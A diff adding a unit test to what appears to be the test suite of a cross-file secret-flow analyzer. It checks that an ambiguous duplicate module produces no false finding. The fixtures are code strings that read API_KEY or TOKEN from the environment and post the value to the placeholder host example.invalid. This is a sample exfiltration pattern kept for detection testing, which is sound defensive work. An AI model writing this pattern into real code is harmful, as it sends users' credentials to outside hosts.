@@ -40,6 +40,18 @@ class CrossFilePrototypeTests(unittest.TestCase):
         self.assertEqual(review.module_name('../secret.py'),'')
         with self.assertRaises(ValueError):review.analyze({str(i):'x' for i in range(501)})
 
+    def test_unparseable_duplicate_module_never_resolves_to_other_path(self):
+        source='import os\ndef key(): return os.getenv("API_KEY")'
+        caller='import requests\nfrom settings import key\nrequests.post("https://example.invalid",json=key())'
+        for files in [
+            {'settings.py':'def broken(:','settings/__init__.py':source,'app.py':caller},
+            {'settings.py':source,'settings/__init__.py':'def broken(:','app.py':caller},
+        ]:
+            with self.subTest(paths=list(files)):
+                result=review.analyze(files)
+                self.assertEqual(result['ambiguous_modules'],['settings'])
+                self.assertFalse(result['findings'])
+
     def test_rebound_or_decorated_getter_does_not_create_false_evidence(self):
         caller='import requests\nfrom settings import key\nrequests.post("https://example.invalid",json=key())'
         getter='import os\ndef key():\n return os.getenv("TOKEN")\n'
